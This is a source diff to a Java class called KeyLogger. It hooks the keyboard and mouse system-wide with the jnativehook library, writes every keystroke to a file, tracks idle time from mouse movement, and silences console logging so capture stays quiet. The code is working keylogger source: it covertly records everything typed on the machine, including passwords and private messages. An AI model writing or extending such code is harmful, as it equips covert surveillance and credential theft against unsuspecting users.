@@ -1,4 +1,4 @@
-package Main;
+package com.application.main;
 
 import java.util.logging.Logger;
 import java.util.logging.Level;
@@ -8,24 +8,36 @@ import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
+import org.jnativehook.mouse.NativeMouseEvent;
+import org.jnativehook.mouse.NativeMouseInputListener;
 
-public class KeyLogger extends Thread implements NativeKeyListener {
+public class KeyLogger extends Thread implements NativeKeyListener, NativeMouseInputListener {
  
 	private FileHandler fileHandler;
+	private TimeHandler timeHandler;
 	
-	public KeyLogger() {
-		fileHandler = FileHandler.getInstance();
+	public KeyLogger() {}
+	
+	public KeyLogger(FileHandler fileHandler) {
+		this.fileHandler = fileHandler;
+		timeHandler = TimeHandler.getInstance();
 	}
 	
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
 		String keyPressed = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
 		String convertedKey = convertKey(keyPressed);
-		System.out.println(convertedKey);
+		//System.out.println(fileHandler);
 		fileHandler.appendToFile(convertedKey);
 	}
 	
-    public void initializeKeyListener() {
+	@Override
+	public void nativeMouseMoved(NativeMouseEvent mouseEvent) {
+		//System.out.println("Mouse Moved: " + mouseEvent.getX() + ", " + mouseEvent.getY());
+		timeHandler.calculateIdleTime();
+	}
+	
+    public void initializeKeyListener(KeyLogger keyLogger) {
     	disableConsoleLogger();
         try {
             GlobalScreen.registerNativeHook();
@@ -34,7 +46,9 @@ public class KeyLogger extends Thread implements NativeKeyListener {
             System.err.println("There was a problem registering the native hook.");
             System.exit(1);
         }
-        GlobalScreen.addNativeKeyListener(new KeyLogger());
+        GlobalScreen.addNativeKeyListener(keyLogger);
+        GlobalScreen.addNativeMouseListener(keyLogger);
+		GlobalScreen.addNativeMouseMotionListener(keyLogger);
     }
 	
     public void disableConsoleLogger() {
@@ -49,6 +63,18 @@ public class KeyLogger extends Thread implements NativeKeyListener {
 
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent keyEvent) {}
+	
+	@Override
+	public void nativeMouseClicked(NativeMouseEvent mouseEvent) {}
+
+	@Override
+	public void nativeMousePressed(NativeMouseEvent mouseEvent) {}
+
+	@Override
+	public void nativeMouseReleased(NativeMouseEvent mouseEvent) {}
+
+	@Override
+	public void nativeMouseDragged(NativeMouseEvent mouseEvent) {}
 	
 	public String convertKey(String keyPressed){
 		switch(keyPressed) {
@@ -88,7 +114,6 @@ public class KeyLogger extends Thread implements NativeKeyListener {
 		}
 		return keyPressed;
 	}
-	
 }
 
 
